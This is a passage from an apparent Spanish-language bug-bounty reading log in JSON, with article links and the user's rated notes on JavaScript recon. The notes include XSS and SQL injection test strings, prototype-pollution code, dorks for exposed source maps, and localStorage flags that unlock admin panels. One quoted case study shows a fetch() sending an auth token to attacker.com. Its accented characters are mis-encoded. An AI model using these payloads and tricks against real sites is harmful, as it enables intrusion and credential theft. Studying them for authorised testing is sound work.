      "note": "Paso 2: Cuerpos de JSON POST\nSi AJAX es el camarero , entonces los cuerpos JSON POST son la nota que le das al camarero con tu pedido personalizado üìù.\n\nüîπ Conceptos b√°sicos:\nEnviado en el cuerpo de la solicitud HTTP, no visible en la URL.\nMuy com√∫n para API y aplicaciones m√≥viles.\nLos desarrolladores lo prefieren porque es ordenado y estructurado.\nüîπ Ejemplo de cuerpo JSON:\nPOST /api/login \nTipo de contenido: aplicaci√≥n/json \n\n{ \n  \"nombre de usuario\" : \"hunter\" , \n  \"contrase√±a\" : \"secret123\"\n }\nüëâ¬øD√≥nde miran los cazadores?\n\nBurp Proxy ‚Üí Inspeccionar el cuerpo de la solicitud.\nReemplazar valores con cargas √∫tiles:\n\"hunter\\\"<script>alert(1)</script>\n\"hunter' OR 1=1 --\"\nA menudo, los cazadores de errores pasan por alto los cuerpos JSON si solo escanean los par√°metros de consulta.\n\n‚ö° Paso 3: Consultas GraphQL\nAhora, GraphQL es como hablar directamente con el chef üë®‚Äçüç≥. No solo pides comida, sino que le dices al chef exactamente qu√© ingredientes quieres y c√≥mo quieres que te los sirvan .\n\nüîπ Conceptos b√°sicos:\nEn lugar de m√∫ltiples puntos finales, un punto final (por ejemplo, /graphql) acepta consultas flexibles.\nLa consulta y los datos se env√≠an en el cuerpo.\nüîπ Ejemplo de consulta:\nPOST /graphql \nTipo de contenido: aplicaci√≥n/json \n\n{ \n  \"consulta\" : \"consulta { usuario(id: \\\"123\\\") { nombre, correo electr√≥nico } }\"\n }\nüëâ¬øD√≥nde miran los cazadores?\n\nBusca /graphqlo solicita con \"query\"o \"mutation\".\nPar√°metros de prueba dentro de cadenas de consulta:\nid: \"123 OR 1=1\"\nname: \"<script>alert(1)</script>\"\nPresione enter o haga clic para ver la imagen en tama√±o completo\n\nüèÜ Palabras finales: La mina de oro de Bug Bounty\nLa mayor√≠a de los cazadores solo buscan par√°metros de consulta visibles . Pero el verdadero tesoro üí∞ reside en:\n\nLlamadas ocultas AJAX üîç\nCuerpos JSON POST üì¶\nConsultas GraphQL üß©",
      "editedTs": 1761489681481,
      "status": "buen"
    },
    {
      "id": "137e6wl",
      "title": "Nuevo informe",
      "payload": "https://infosecwriteups.com/unleash-the-power-of-js-link-finder-hunt-hidden-endpoints-like-a-pro-deb77530155f",
      "note": "nada",
      "editedTs": 1761490056436,
      "status": "monton"
    },
    {
      "id": "j1kavof",
      "title": "Nuevo informe",
      "payload": "https://medium.com/@Tanvir0x1/750-bug-bounty-the-story-of-a-hidden-discount-code-in-js-files-1a39bbecff27",
      "note": "encontro un cupon de descueto del 70% en archivo oculto de .js lo aplico funciono pero el bounty fue super poco solo 750 mal por hunter f.",
      "editedTs": 1761490198867,
      "status": "regular"
    },
    {
      "id": "yyk9yz8",
      "title": "Nuevo informe",
      "payload": "https://medium.com/@marduk.i.am/recon-methodology-javascript-file-hunting-254127ecd211",
      "note": "nada interesante.",
      "editedTs": 1761490270591,
      "status": "monton"
    },
    {
      "id": "d0q2z4d",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://infosecwriteups.com/token-tales-finding-hidden-api-keys-in-javascript-and-turning-them-into-gold-e4e93c51e52b",
      "note": "pos nada interesante.",
      "editedTs": 1761490409805,
      "status": "monton"
    },
    {
      "id": "ay6ezv4",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://amannsharmaa.medium.com/day-21-the-ghost-api-how-i-found-a-secret-backdoor-in-a-fortune-500s-javascript-5bd4f17e17dd",
      "note": "El c√≥digo tambi√©n busc√≥ [error] window.INTERNAL_OVERRIDE. Este es un patr√≥n de depuraci√≥n com√∫n.",
      "editedTs": 1761490717822,
      "status": "buen"
    },
    {
      "id": "4dvgqym",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://medium.com/@narendarlb123/%EF%B8%8F-javascript-recon-via-github-finding-secrets-before-you-even-hit-the-app-cb88e36bc0d7",
      "note": "Archivos JS internos filtrados\nBuscar:\n\nadmin.js, internal.js, beta.js,staging.bundle.js\ndebug.js, test.js, monitor.js,analytics.js\nEstos a menudo incluyen:\n\nRutas de API internas no expuestas en producci√≥n\nConmutadores de funciones\nCondicionales JS que revelan rutas l√≥gicas (por ejemplo, if (user.isAdmin))\n2Ô∏è‚É£ Puntos finales expuestos\nMira dentro:\n\naxios.get, fetch(), $.ajax, XMLHttpRequest, o personalizadoapiClient.get\nEstos revelan:\n\nPuntos finales de API completos como/api/user/tokens\nPaneles de administraci√≥n (por ejemplo, /admin/metrics)\nConsultas REST/GraphQL ocultas\n3Ô∏è‚É£ Secretos y claves API\nLugares comunes:\n\nconfig.js, settings.js,.env.sample\nFormatos comunes:\n\nconst API_KEY = \"sk_live_123abc456xyz\"; const firebaseConfig = { apiKey: \"AIza...\" };\n4Ô∏è‚É£ Tokens expuestos en confirmaciones de JS\nA menudo se encuentra en:\nConfirmaciones tempranas ( git log)\nRamas de prueba enviadas\nNotas para desarrolladores en las relaciones p√∫blicas\nFlujo de reconocimiento de GitHub para detectar la exposici√≥n basada en JS\nüîπ Paso 1: Identificar la organizaci√≥n o los desarrolladores\nNombre de la empresa/organizaci√≥n de destino\nBuscar en GitHub:\n\norg:companyname filename:*.js org:companyname \"axios.get\"\nO utilice OSINT para descubrir:\n\nNombres de usuario de desarrolladores a trav√©s de LinkedIn\nContribuciones a los repositorios de la organizaci√≥n mediante contributorgr√°ficos\n\n\n\nPaso 3: Analizar la l√≥gica de JS\nUna vez que encuentre los archivos JS:\n\nBusque l√≥gica condicional (rutas de administraci√≥n, omisiones de autenticaci√≥n):\n\nif (user.role === \"admin\") { // show advanced panel }\nEncuentra rutas de desarrollo internas :\n\nconst baseURL = \"https://staging-api.example.com/v2\"\nFunciones de seguimiento que llaman a puntos finales sensibles (como /tokens, /reset-password, /verify-otp)\nüîπ Paso 4: Explorar el repositorio en busca de archivos .map (mapas de origen)\nA veces los desarrolladores env√≠an .maparchivos, lo que minimiza JS.\n\nBuscar en GitHub:\n\nfilename:*.map org:target\nDescargue el .maparchivo e invi√©rtalo usando:\nherramientas de visualizaci√≥n de mapas de origen\nsource-map-explorer\nEsto le proporciona JS de nivel de desarrollo , completo con comentarios y nombres de funciones.\n\nBono: Ruta de explotaci√≥n despu√©s del descubrimiento\nSi encuentra una ruta JS interna como:\n\nCopiar\napiClient.post('/reset-password', { email })\nPuede:\n\nVerificar si el punto final est√° abierto (prueba mediante Postman)\nComprobar si se aplica la autenticaci√≥n (encabezados faltantes)\nIntente abusar de √©l con cargas √∫tiles creadas:\n\nOmitir restablecimiento de contrase√±a\nFuerza bruta de OTP\nInyecci√≥n de correo electr√≥nico, etc.\n\n\nHerramientas para potenciar este reconocimiento\nüîç github-subdomains: Encuentra subdominios desde el c√≥digo de GitHub\nüîé trufflehog, gitleaks: Atrapa secretos\nüì¶ usedJS: (si est√° archivado, usa bifurcaciones o alternativas como JSFinder)\nüîÑ gf, grep, ripgrep: Para la coincidencia de patrones en repositorios clonados\nüìÅ source-map-explorer: Archivos .map de JS inversos",
      "editedTs": 1761491032657,
      "status": "excelente"
    },
    {
      "id": "nomaw6j",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://javascript.plainenglish.io/burp-extensions-js-recon-on-steroids-from-endpoints-to-exploits-4c5946997201",
      "note": "varias extensiones de bupp suite.",
      "editedTs": 1761491264852,
      "status": "regular"
    },
    {
      "id": "085pva2",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://javascript.plainenglish.io/404-js-github-a-triple-threat-attack-surface-82775003f078",
      "note": "nada interesante.",
      "editedTs": 1761492441863,
      "status": "monton"
    },
    {
      "id": "0emqyxr",
      "title": "Nuevo informe",
      "payload": "https://medium.com/@zoningxtr/how-javascript-runs-browser-vs-pc-vs-beyond-understanding-its-environment-benefits-efe7c4621e4f",
      "note": "Como funciona realmente .js en los navegadores con los diferentes motores que tiene cada navegador.\n\n\nC√≥mo funciona :\nEl navegador tiene un motor JavaScript incorporado.\nChrome ‚Üí Motor V8\nFirefox ‚Üí SpiderMonkey\nSafari ‚Üí JavaScriptCore\nCuando el navegador lee una <script>etiqueta en HTML, env√≠a el c√≥digo JavaScript a este motor.\nEl motor analiza (lee) y ejecuta (corre) el c√≥digo l√≠nea por l√≠nea.\nAs√≠ que b√°sicamente el entorno es:\n\nNavegador (con motor JS) \n      ‚Ü≥ Ejecuta JavaScript \n      ‚Ü≥ Da acceso a las API del navegador (DOM, eventos, etc.)\nüîπ D√≥nde se puede ejecutar JavaScript (adem√°s del navegador)\nEn la PC (fuera del navegador):\nCon Node.js ‚Üí un entorno de ejecuci√≥n que utiliza el motor V8 de Chrome pero agrega caracter√≠sticas de PC/servidor (archivos, red, etc.).\nEjemplo:\n// test.js console.log ( \" ¬°Hola desde Node.js!\" );\nCorrer con:\nprueba de nodo.js\nEn servidores :\nJavaScript puede impulsar aplicaciones backend completas (por ejemplo, sitios web creados con Express.js en Node.js).\nEn bases de datos :\nalgunas bases de datos (como MongoDB) permiten JavaScript para consultas.\nEn otros lugares :\nAplicaciones m√≥viles (React Native).\nAplicaciones de escritorio (Electron, como VS Code).\nDispositivos IoT (bombillas inteligentes, Raspberry Pi).\nüîπ ¬øQu√© sucede si JavaScript no est√° disponible?\nEn el navegador :\nLa p√°gina se cargar√°, pero solo como HTML y CSS simples ‚Üí sin interactividad.\nEjemplo: Se mostrar√° un formulario de inicio de sesi√≥n, pero al presionar ‚ÄúEnviar‚Äù es posible que no se valide la entrada al instante.\nLos men√∫s desplegables, las animaciones o las ventanas de chat no funcionar√°n.\nEn el servidor/PC :\nSi falta JavaScript, no podr√°s ejecutar aplicaciones Node.js ni herramientas basadas en JS.\nüîπ Beneficios de JavaScript\n‚úÖ Funciona en todas partes (multiplataforma).\n‚úÖ Hace que los sitios web sean din√°micos e interactivos .\n‚úÖ Enorme ecosistema (bibliotecas como React, Angular, Vue).\n‚úÖ El mismo lenguaje se puede usar para frontend + backend .\n‚úÖ Muy popular ‚Üí muchos trabajos, soporte, herramientas.\n\nEjemplo para comparar:\n\nSin JS (s√≥lo HTML):\n\nBot√≥n < Haz clic en m√≠ </ bot√≥n >\nüëâ Solo un bot√≥n. No hace nada.\n\nCon JS:\n\n< button  onclick = \"alert('¬°Hola!')\" > Haz clic en m√≠ </ button >\nüëâAhora aparece un mensaje.\n\nEn resumen:\nJavaScript se ejecuta dentro de un motor (principalmente en el navegador), pero gracias a Node.js tambi√©n puede ejecutarse fuera de √©l, en PC, servidores e incluso dispositivos IoT. Sin √©l, la web ser√≠a est√°tica y aburrida.",
      "editedTs": 1761492679640,
      "status": "excelente"
    },
    {
      "id": "fzc2ryt",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://javascript.plainenglish.io/10-javascript-mistakes-even-senior-developers-still-make-and-how-to-avoid-them-e5977848f327",
      "note": "Muy bueno explicacion a detalle sobre los 10 errores mas comunes de js\nsuper bueno mirar aprendes mucho incluso sirve para otra vulnerabilidad protype etc super bueno.\n\nProfundizar mas en js errores comunes tips etc:\n\n\n1Ô∏è‚É£ Confusi√≥n de igualdad: ==vs===\nLa igualdad flexible ( ) de JavaScript ==realiza una coerci√≥n de tipos , lo que conduce a resultados extra√±os.\n\nCopiar\n0 == false; // true\n0 === false; // false\n\"\" == 0; // true\n[] == false; // true\nüëâEl Error: Confiar accidentalmente en ==comparar valores.\n\nSoluci√≥n : √ösalo siempre, ===a menos que tengas una raz√≥n muy espec√≠fica para obligarte. Las reglas de pelusa ( eqeqeq) pueden hacer que esto suceda.\n\n2Ô∏è‚É£ Olvidar letyconst\nDeclarar variables sin let/ constcrea autom√°ticamente una variable global (en modo no estricto).\n\nCopiar\nfunction test() {\n  message = \"Oops!\";\n}\ntest();\nconsole.log(message); // \"Oops!\" leaked to global scope\nüëâEl Error: Ensombrecer o contaminar el √°mbito global sin intenci√≥n.\n\n‚úÖ La soluci√≥n: utilice use stricto configure siempre ESLint para evitar variables no declaradas.\n\n3Ô∏è‚É£ Mal usothis\nthisNo se comporta como la mayor√≠a de los desarrolladores de programaci√≥n orientada a objetos esperan. Su valor depende de c√≥mo se llama a una funci√≥n , no de d√≥nde se define.\n\nCopiar\nconst obj = {\n  name: \"Alice\",\n  greet: function () {\n    setTimeout(function () {\n      console.log(this.name); // undefined\n    }, 100);\n  },\n};\nobj.greet();\nüëâEl error: Esperar thishacer referencia objdentro del callback.\n\n‚úÖ La soluci√≥n: utilice funciones de flecha o vincule expl√≠citamente:\n\nCopiar\nsetTimeout(() => console.log(this.name), 100);\n4Ô∏è‚É£ Pesadillas matem√°ticas de punto flotante\nJavaScript utiliza doble precisi√≥n IEEE 754 , por lo que algunos n√∫meros no se pueden representar con exactitud.\n\nCopiar\n0.1 + 0.2 === 0.3; // false\nüëâEl error: confiar en matem√°ticas decimales precisas para monedas, finanzas o mediciones.\n\n‚úÖ La soluci√≥n: utilice bibliotecas ( decimal.js, big.js) o BigIntpara mayor precisi√≥n.\n\n5Ô∏è‚É£ Mal uso de Async/Await\nIncluso los desarrolladores experimentados olvidan que awaitsolo funciona dentro asyncde funciones y que serializa operaciones a menos que se use con prudencia.\n\nCopiar\n// ‚ùå Slow: runs sequentially\nawait task1();\nawait task2();\n// ‚úÖ Faster: run in parallel\nawait Promise.all([task1(), task2()]);\nüëâEl error: convertir el c√≥digo asincr√≥nico en c√≥digo lento y pseudo-sincr√≥nico.\n\n‚úÖ La soluci√≥n: saber cu√°ndo se pueden paralelizar las tareas y utilizarlas Promise.all.\n\n6Ô∏è‚É£ Congelaci√≥n accidental del bucle de eventos\nLas operaciones de bloqueo bloquean el bucle de eventos de un solo subproceso.\n\nCopiar\nwhile (true) {} // ‚ùå Infinite loop, app freezes\nüëâ El error: escribir bucles que consumen mucho CPU o operaciones de sincronizaci√≥n en Node.js/navegador.\n\n‚úÖ La soluci√≥n: divida el trabajo en fragmentos con setImmediate, setTimeout, o utilice trabajadores para tareas que requieren un uso intensivo de la CPU.\n\n7Ô∏è‚É£ Confuso nullyundefined\nEstos dos son tipos diferentes , pero muchos desarrolladores los tratan de la misma manera.\n\nCopiar\ntypeof null; // \"object\" (bug since 1995!)\ntypeof undefined; // \"undefined\"\nüëâEl Error: Olvidar que nullest√° expl√≠citamente asignado, mientras que undefinedmuchas veces significa ‚Äúa√∫n no definido‚Äù.\n\n‚úÖ Soluci√≥n: S√© intencional: √∫salo nullpara \"valor vac√≠o\" undefinedo \"no asignado\". Herramientas como TypeScript ayudan.\n\n8Ô∏è‚É£ Ignorar la contaminaci√≥n de los prototipos\nLos objetos JS son mutables y comparten prototipos : a los atacantes les encanta esto.\n\nCopiar\nlet payload = JSON.parse('{\"__proto__\":{\"polluted\":\"yes\"}}');\nconsole.log({}.polluted); // \"yes\"\nüëâ El error: Fusiones de objetos no seguras ( Object.assignbibliotecas de copia profunda).\n\n‚úÖ Soluci√≥n: Sanee la entrada del usuario y congele los objetos cr√≠ticos. Las revisiones de seguridad siempre deben verificar el manejo de objetos.\n\n9Ô∏è‚É£ Pensar for...ines seguro\nfor...inTambi√©n itera sobre las propiedades heredadas , no solo sobre las propias del objeto.\n\nCopiar\nObject.prototype.hack = \"üíÄ\";\nfor (let key in { a: 1 }) {\n  console.log(key); // \"a\", \"hack\"\n}\nüëâEl Error: Llaves inesperadas filtr√°ndose en los bucles.\n\n‚úÖ La soluci√≥n: utiliza Object.keys(), Object.values(), o Object.entries().\n\nüîü El uso excesivo eval()oFunction()\nSigue siendo uno de los mayores errores.\n\nCopiar\neval(\"console.log('Hacked!')\"); // Arbitrary code execution\nüëâEl error: utilizar evalpara comportamiento din√°mico.\n\n‚úÖ La soluci√≥n: Ev√≠talo a toda costa. Casi siempre hay una alternativa m√°s segura.\n\nüéØ Conclusiones clave\nLas peculiaridades de JavaScript no son \"errores de principiante\": son minas terrestres que incluso los desarrolladores m√°s experimentados pisan.\nMuchos errores no son simplemente errores, son problemas de seguridad (XSS, contaminaci√≥n de prototipos, DoS).\nLa mejor defensa es una combinaci√≥n de an√°lisis de errores, revisi√≥n de c√≥digo y pruebas , no solo la intuici√≥n del desarrollador.",
      "editedTs": 1761493073772,
      "status": "excelente"
    },
    {
      "id": "ug24via",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://infosecwriteups.com/day-15-the-phantom-js-threat-how-forgotten-code-became-a-silent-rce-bomb-e4f9551b14d8",
      "note": "esta bueno ya que habla sobre rce mediante un archivo .js que por uan transiccion de version de next dejo sin cometar parte del codigo funciones y por ende expuesto.",
      "editedTs": 1761493349322,
      "status": "buen"
    },
    {
      "id": "zwafn6y",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://javascript.plainenglish.io/javascript-burp-github-supply-chain-goldmine-81cbf39d575c",
      "note": "nada interesante.",
      "editedTs": 1761493426437,
      "status": "monton"
    },
    {
      "id": "xhu05ps",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://javascript.plainenglish.io/ghosts-in-the-heap-memory-leaks-in-javascript-and-how-to-hunt-them-like-a-pro-0519d95d1630",
      "note": "No entiendo del todo me falta conocimiento mas solidos de js, para poder manejar la fuga de memoria entendi algo pero no logro captar como hacerlo realmente.",
      "editedTs": 1761493723030,
      "status": "buen"
    },
    {
      "id": "vraa5sp",
      "title": "Nuevo informe",
      "payload": "https://cyphernova1337.medium.com/how-i-used-the-js-map-file-to-gain-admin-access-e30e6f00adb7",
      "note": "El .js.maparchivo act√∫a como gu√≠a, proporcionando un mapa detallado entre el c√≥digo minimizado y el c√≥digo fuente original, legible para humanos, incluyendo nombres de variables, nombres de funciones, rutas de archivos e incluso comentarios. Esto significa que, si un js.maparchivo es de acceso p√∫blico, un atacante puede reconstruir eficazmente todo el √°rbol de c√≥digo fuente de la aplicaci√≥n.\n\nEste c√≥digo fuente reconstruido puede revelar:\n\nPuntos finales de API: puntos finales de API ocultos o internos que no est√°n documentados p√∫blicamente.\nEstructuras y esquemas de datos: la estructura exacta de los objetos de datos, incluidas las consultas y esquemas GraphQL, que a menudo definen campos y operaciones sensibles.\nMecanismos de autenticaci√≥n: detalles sobre c√≥mo se manejan la autenticaci√≥n y autorizaci√≥n de los usuarios.\nL√≥gica empresarial: informaci√≥n sobre la funcionalidad principal de la aplicaci√≥n, incluidas posibles vulnerabilidades.\nCadenas sensibles: a veces, claves API codificadas, secretos o identificadores internos.\n\n\nDesempaquetado de mapas fuente con Sourcemapper\nPara trabajar eficazmente con js.maparchivos, las herramientas especializadas son invaluables. Una de ellas es Sourcemapper .\n\nSourcemapper est√° dise√±ado para extraer √°rboles de c√≥digo fuente de JavaScript de archivos Sourcemap. Analiza un mapa de c√≥digo fuente, generalmente generado por empaquetadores como Webpack, y luego recrea los archivos JavaScript originales y su estructura de directorios seg√∫n las rutas de archivo especificadas en el mapa de c√≥digo fuente.\n\nSourcemapper puede procesar un .maparchivo directamente desde una URL o un archivo local. Tambi√©n puede procesar un archivo JavaScript desde una URL, detectando y descargando autom√°ticamente cualquier referencia a sourcemap (incluyendo referencias absolutas, relativas y data:URI). Una vez recuperado y analizado el sourcemap, Sourcemapper escribe los archivos fuente extra√≠dos en un directorio de salida espec√≠fico, proporcionando una r√©plica completa del c√≥digo fuente original.\n\nPara una b√∫squeda y volcado de vulnerabilidades GraphQL m√°s extenso, graphqlmaptambi√©n se encuentran disponibles herramientas como . graphqlmapes conocido por sus capacidades para automatizar el proceso de b√∫squeda y explotaci√≥n de vulnerabilidades GraphQL, incluido el volcado de esquema completo.",
      "editedTs": 1761494108967,
      "status": "muybueno"
    },
    {
      "id": "7ksjd5r",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://osintteam.blog/uncovering-hidden-admin-tools-via-javascript-debug-flags-96813d62cc9d",
      "note": "MUY BUENO FUNCIONES OCULTRAS DE DEBUG ETC.\n\nLos frontends modernos (React, Angular, Vue, Svelte) suelen depender de conmutadores de funciones, indicadores de entorno y componentes renderizados condicionalmente que permanecen inactivos o invisibles en el flujo de trabajo normal del usuario. Sin embargo, a veces, los desarrolladores dejan estos conmutadores en el c√≥digo de producci√≥n, ya sea por accidente o por comodidad de acceso interno.\n\nEstas banderas pueden activar vistas de depuraci√≥n, paneles internos, funciones privilegiadas o herramientas de administraci√≥n. Al ser expuestas a usuarios no autenticados o incluso a cuentas con pocos privilegios, pueden utilizarse para la escalada de privilegios, eludir la l√≥gica, divulgar informaci√≥n o controlar completamente la aplicaci√≥n.\n\n\nQu√© son los indicadores de depuraci√≥n y las herramientas para desarrolladores?\nEn las aplicaciones frontend, los desarrolladores a menudo introducen atajos o herramientas de depuraci√≥n para:\n\nFunciones de alternancia en desarrollo\nRegistro del estado interno\nObtener acceso de administrador r√°pidamente\nSimulaci√≥n de casos extremos\nCambio de entornos (producci√≥n, desarrollo, ensayo)\nEstos se controlan a trav√©s de variables como:\n\ndebug=true\nmode=admin\ndevPanel=1\nwindow.__SHOW_ADMIN__ = true\nlocalStorage.setItem(\"isAdmin\", true)\nEn teor√≠a, estas banderas se eliminan o desactivan antes de que el c√≥digo se env√≠e a producci√≥n. En realidad, las implementaciones apresuradas, los errores de CI/CD y los paquetes minimizados pero no ofuscados suelen provocar que estas caracter√≠sticas se filtren a los entornos de producci√≥n.\n\nA veces, son inofensivos. Otras veces, desbloquean paneles de control completos que no est√°n destinados al p√∫blico.\n\nBusque tambi√©n comprobaciones condicionales y alternancias de funciones:\n\n\ngrep -P 'if\\\\s*\\\\(.(localStorage|sessionStorage|window.location|cookies)' js_files/* > logic_hits.txt\n\n\n: Decodificar archivos minimizados u ofuscados\nUtilice herramientas como:\n\nBeautifier.io\njs-beautify\nM√°s bonita\nHacer que el c√≥digo sea legible para humanos e identificar patrones l√≥gicos.\n\nPaso 4: Emular las condiciones de la bandera\nBusque cosas como:\n\nCopiar\nif (window.location.search.includes(\"mode=admin\")) {\n   renderAdminPanel();\n}\nO:\n\nCopiar\nif (localStorage.getItem(\"betaUI\") === \"true\") {\n   launchBeta();\n}\nIntente activarlos manualmente:\n\nCopiar\nlocalStorage.setItem(\"betaUI\", \"true\");\nlocation.reload();\nO:\n\nCopiar\n<https://target.com/app?mode=admin>\nPaso 5: Busque llamadas API internas\nSi aparece una interfaz de depuraci√≥n o administraci√≥n, revise la pesta√±a Red en DevTools. Busque nuevas solicitudes de API o acceso a endpoints privilegiados.\n\nSi ve solicitudes a puntos finales como:\n\nCopiar\n/api/internal/*\n/api/admin/users\n/api/logs\nEs posible que est√©s viendo funciones backend sensibles desbloqueadas a trav√©s de indicadores frontend.\n\n\nCasos reales de herramientas administrativas ocultas\nCaso 1: Vista de depuraci√≥n de Vue conadmin=true\n\nUn investigador descubri√≥ que al agregar ?admin=trueuna URL a un panel basado en Vue se generaba un dise√±o completamente nuevo con:\n\nSuplantaci√≥n de identidad de usuario\nRegistros sin procesar\nM√©tricas del sistema en vivo\nModos de prueba de la pasarela de pago\nCaso 2: React Build con el indicador LocalStorage\n\nEn una aplicaci√≥n React, el investigador encontr√≥ esto en el c√≥digo:\n\nCopiar\nif (localStorage.getItem(\"showDebug\") === \"yes\") {\n   render(<DevTools />);\n}\nEjecutando esto en la consola del navegador:\n\nCopiar\nlocalStorage.setItem(\"showDebug\", \"yes\");\nlocation.reload();\nLa p√°gina se recarg√≥ con una pesta√±a adicional que muestra:\n\nVariables de entorno\nTokens de API en memoria\nProbar los cambios de usuario\nCaso 3: Ruta angular oculta con par√°metro de consulta\n\nUna SPA angular conten√≠a una ruta oculta que solo era visible si el usuario navegaba a:\n\nCopiar\n<https://target.com/dashboard?mode=god>\nDesbloque√≥ los permisos CRUD en un recurso que los usuarios regulares s√≥lo pod√≠an ver.\n\nCaso 4: Importaciones condicionales\n\nA veces, las herramientas de depuraci√≥n se importan pero se inicializan condicionalmente:\n\nCopiar\nif (process.env.SHOW_INTERNAL_TOOLS) {\n   import(\"./internalTools.js\").then(initTools);\n}\nSin embargo, el paquete los incluy√≥ de todas formas y los investigadores expertos encontraron el archivo JS y lo invocaron initTools()manualmente a trav√©s de DevTools.",
      "editedTs": 1761494784117,
      "status": "excelente"
    },
    {
      "id": "mziq2g6",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://medium.com/h7w/deep-recon-finding-secrets-in-javascript-with-deep-recon-99abb2c9ad85",
      "note": "T√©cnicas avanzadas de JS RE\nL√≥gica ofuscada\nBuscar:\n\nNombres de variables aleatorias (por ejemplo, _0x12abf1)\nLlamadas de funci√≥n codificadas ( eval(atob(...)))\nEnvoltura de funciones y manipulaci√≥n de cadenas\nUsar:\n\nde4jspara decodificar\nChrome DevTools para establecer puntos de interrupci√≥n e inspeccionar variables\nCambio de nombre manual para mayor claridad\nDepuraci√≥n en DevTools\nAbra DevTools del navegador (pesta√±a Fuentes)\nImprima con precisi√≥n ( {}icono) cualquier script empaquetado\nEstablecer puntos de interrupci√≥n en fetch()llamadas interesantes\nRutas de funciones de seguimiento\n\n\n\n\nAbuso de banderas de caracter√≠sticas\nPuede encontrar:\n\nCopiar\nif (window.localStorage.getItem(\"enableBeta\") === \"true\") {\n   renderBetaUI();\n}\nDisparador a trav√©s de DevTools:\n\nCopiar\nlocalStorage.setItem(\"enableBeta\", \"true\"); location.reload();\nO comprobar si los par√°metros de URL activan flujos ocultos:\n\nCopiar\n<https://target.com/dashboard?debug=true>\n3. Identificaci√≥n de puntos finales obsoletos o heredados\nMuchas aplicaciones web conservan el soporte heredado:\n\nCopiar\n/v1/user/update\n/v2/user/update\nA veces, /v1/la l√≥gica carece de autenticaci√≥n o validaci√≥n modernas. JS podr√≠a exponer un comportamiento alternativo:\n\nCopiar\nif (version === 'v1') useOldHandler();\nIntente acceder directamente a rutas m√°s antiguas para comprobar si hay ataques de degradaci√≥n.\n\n4. Consultas ocultas de GraphQL\nCompruebe si JS contiene operaciones GraphQL:\n\nCopiar\nquery getUserData($id: ID!) {\n   user(id: $id) {\n      email, role, token\n   }\n}\nLos desarrolladores suelen incluir consultas de introspecci√≥n, ejemplos de variables o esquemas completos en paquetes de JavaScript. √ösalos para crear ataques GraphQL personalizados.\n\nEstudios de casos del mundo real\nCaso: Ladr√≥n de fichas ocultas\nUn investigador encontr√≥ esto en JS:\n\nCopiar\nconst token = window.localStorage.getItem(\"authToken\");\nfetch(\"<https://attacker.com/collect>\", { method: \"POST\", body: token })\nResult√≥ ser un complemento malicioso incluido por error, lo que provoc√≥ una violaci√≥n de datos y una recompensa de $3,000.\n\nCaso: Escalada de API heredada\nSe utiliz√≥ un SPA /v2/checkout, pero JS hizo referencia a un obsoleto /v1/checkout:\n\nCopiar\nif (!useNewFlow) return callLegacy();\nEl punto final v1 acept√≥ c√≥digos de cup√≥n sin validaci√≥n, lo que gener√≥ un error l√≥gico y una recompensa de $1200.\n\nIdeas de automatizaci√≥n\nCrea un script personalizado que:\n\nDescargas archivos JS\nEmbellece y escanea en busca de palabras clave sensibles.\nExtrae puntos finales de API y consultas GraphQL\nAlternancias de depuraci√≥n de banderas y banderas de caracter√≠sticas\nUtilice GitHub Actions o un trabajo cron para repetir esto semanalmente para alcances grandes.\n\nConsejos para la elaboraci√≥n de informes\nAl escribir su informe:\n\nMostrar fragmento de JS original\nResalte la funci√≥n o punto final oculto\nDemostrar el impacto: nivel de acceso, exposici√≥n de datos, l√≥gica ignorada\nProporcionar pasos de reproducci√≥n (DevTools, llamadas API, indicadores de almacenamiento local)\nIncluir capturas de pantalla/v√≠deos\n\nConclusi√≥n\nLa combinaci√≥n del reconocimiento profundo con la ingenier√≠a inversa de JavaScript permite acceder a un nivel superior de reconocimiento de errores. Es un proceso lento, detallado y a menudo frustrante, pero la recompensa vale la pena. Con este enfoque, no solo se encuentran errores, sino que se descubre la arquitectura oculta de una aplicaci√≥n.\n\nLas aplicaciones web modernas filtran mucho m√°s de lo que los desarrolladores esperan. Su JavaScript revela la intenci√≥n, la estructura y los secretos. Solo hay que mirar.",
      "editedTs": 1761495201507,
      "status": "excelente"
    },
    {
      "id": "p8wbl9m",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://medium.com/legionhunters/js-map-deep-recon-for-bug-hunters-c9571a053fbb",
      "note": "Tipo de tecnolog√≠a en la que centrarse m√°s\n\nAplicaci√≥n React\nVue.js\nAplicaci√≥n angular\nAplicaci√≥n Next.js\nBasado en Webpack\nAplicaci√≥n basada en Vite\nProyectos de empaquetadora de paquetes\n\n\nFOFA Dorking\n\nüëâ sitio: es.fofa.info\n\nCopiar\nbody=\".js.map\"\nbody=\"# sourceMappingURL\"\nbody=\"sourceMappingURL\"\nbody=\"sourceMappingURL=\" && body=\".js.map\"\nbody=\"\\\"version\\\":3\" && body=\"\\\"sources\\\":\" && body=\"\\\"mappings\\\":\"\nbody=\"main.js.map\"\nbody=\"app.js.map\"\nbody=\"bundle.js.map\"\nbody=\"index.js.map\"\nbody=\"vendor.js.map\"\nbody=\"chunk.js.map\nbody=\"runtime.js.map\"\nbody=\"polyfills.js.map\"\n\n#target filtering\nexisting_dork && domain=\"example.com\"\n\n\n\nZoomEye Dorking\n\nüëâ sitio: zoomeye.ai\n\nCopiar\nhttp.body=\".js.map\" && domain=\"example.com\"\nhttp.body=\"# sourceMappingURL\" && domain=\"example.com\"\nhttp.body=\"sourceMappingURL\" && domain=\"example.com\"\n\n#just replace the fofa dorks from body= with http.body=, rest is same\n\n\n\n Plantilla b√°sica de n√∫cleos\n\nCopiar\nid: js-map-keyword-detected\n\ninfo:\n  name: JS Map Keyword Detection\n  author: Legion Hunter\n  severity: info\n  description: Detects if \".js.map\" appears in the HTML response body of a GET request.\n  tags: exposure,jsmap,files\n\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}\"\n    matchers:\n      - type: word\n        words:\n          - \".js.map\"\n        part: 